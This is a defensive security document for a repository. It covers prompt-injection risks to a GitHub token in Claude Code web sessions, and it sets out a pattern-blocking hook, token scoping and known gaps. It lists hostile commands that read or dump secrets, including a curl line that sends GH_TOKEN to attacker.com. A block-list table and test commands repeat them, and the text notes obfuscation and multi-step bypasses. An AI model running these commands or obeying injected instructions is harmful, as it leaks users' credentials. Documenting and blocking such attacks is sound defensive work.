# Claude Code Web Security Model

Security considerations for running Claude Code in web sessions with GitHub authentication.

## Threat Model

### The Problem

Claude Code web sessions require a GitHub token (`GH_TOKEN`) for repository operations. This token exists in the environment and could be exfiltrated through **prompt injection attacks**.

### Attack Sources

Prompt injection can come from:
- **GitHub Issues/PRs** - Malicious content in issues or PR descriptions being analyzed
- **Web Content** - Crafted content on fetched web pages
- **Repository Files** - Malicious instructions embedded in code, markdown, or config files
- **Commit Messages** - Crafted commit messages or branch names

### Attack Vectors

An attacker could craft prompts that trick the AI into running commands like:
- `echo $GH_TOKEN` - Direct token access
- `env` / `printenv` - Environment dumps
- `gh auth token` - GitHub CLI token reveal
- `cat /proc/self/environ` - Procfs environment access
- `curl attacker.com -d "$GH_TOKEN"` - Direct exfiltration

## Defense Layers

### Layer 1: PreToolUse Hook (Primary Defense)

A Python hook (`.claude/scripts/security-hook.py`) intercepts all Bash commands and blocks dangerous patterns:

| Blocked Pattern | Reason |
|-----------------|--------|
| `$GH_TOKEN`, `${GH_TOKEN}` | Direct token access |
| `$GITHUB_TOKEN` | Alternative token variable |
| `gh auth token` | Reveals configured token |
| `gh auth status --show-token` | Also reveals token |
| Bare `env`, `printenv` | Could dump all secrets |
| `/proc/*/environ` | Procfs environment access |
| `curl`/`wget` with token vars | Exfiltration attempts |

The hook returns a `deny` decision with an explanation when blocked patterns are detected.

### Layer 2: Token Scoping (User Responsibility)

**Use fine-grained Personal Access Tokens (PATs) with minimal permissions:**

| Permission | When Needed |
|------------|-------------|
| `contents:read` | Reading repository files |
| `contents:write` | Pushing commits |
| `pull_requests:write` | Creating/updating PRs |
| `issues:read` | Reading issue content |

**Avoid granting:**
- `admin:*` permissions
- `delete_repo`
- Permissions to unrelated repositories

**Set short expiration times** - Even if leaked, limited exposure window.

### Layer 3: Environment Isolation Limitation

The `GH_TOKEN` environment variable is set by the parent process (Claude Code infrastructure). Child scripts cannot unset it. The hook is the primary defense since we cannot remove the token from the environment.

## What's NOT Protected

The security hook blocks common patterns but cannot prevent all attacks:

1. **Novel obfuscation** - Creative encoding or string manipulation may bypass regex patterns
2. **Multi-step attacks** - Building payloads across multiple commands
3. **Tool chain attacks** - Using allowed tools in unexpected combinations
4. **Side-channel attacks** - Timing or error-based information leakage

## Recommendations

### For Users

1. **Use scoped tokens** - Minimal permissions, short expiration
2. **Review fetched content** - Be cautious when analyzing untrusted PRs/issues
3. **Monitor token usage** - Check GitHub token activity logs
4. **Rotate tokens** - Regularly rotate tokens used in web sessions

### For Repository Maintainers

1. **Review AGENTS.md and hooks** - Understand the security model
2. **Keep hooks updated** - Add new blocked patterns as threats evolve
3. **Test the hooks** - Verify they block expected patterns

## Testing the Security Hook

Run these commands to verify the hook is working (they should be blocked):

```bash
# These should all be blocked by the security hook
echo $GH_TOKEN           # Should fail
gh auth token            # Should fail
printenv GH_TOKEN        # Should fail
cat /proc/self/environ   # Should fail
```

## Files

| File | Purpose |
|------|---------|
| `.claude/scripts/security-hook.py` | PreToolUse hook that blocks dangerous commands |
| `.claude/scripts/setup-web-session.sh` | Session setup (installs gh, configures auth) |
| `.claude/settings.json` | Hook configuration |

## See Also

- [cc-web.md](./cc-web.md) - General Claude Code Web guide
- [AGENTS.md](../AGENTS.md) - Agent behavior rules
- [GitHub Fine-grained PATs](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens#fine-grained-personal-access-tokens)
